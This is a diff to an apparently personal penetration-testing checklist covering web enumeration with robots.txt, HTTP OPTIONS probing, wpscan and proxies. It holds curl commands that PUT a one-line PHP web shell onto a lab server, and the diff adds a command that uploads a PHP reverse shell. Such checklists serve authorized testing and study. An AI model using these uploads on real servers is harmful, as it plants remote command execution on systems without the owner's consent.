@@ -20,6 +20,7 @@
 1. if there is a `robots.txt`, check if there is anything that the scanners didn't find
 1. also use `curl -i -X OPTIONS http://ip/path` to check what METHODs are available on specific resource
     - `curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.142.131/test/shell.php`
+    - `curl --upload-file  php-reverse-shell.txt -v --url http://192.168.142.131/test/shell.php -0 --http1.0`
 1. wpscan to find wordpress problems
 1. cms scan (? todo: read it from a tool)
 1. if there is a proxy server run on the target, try to set browser's proxy pointing to the proxy server
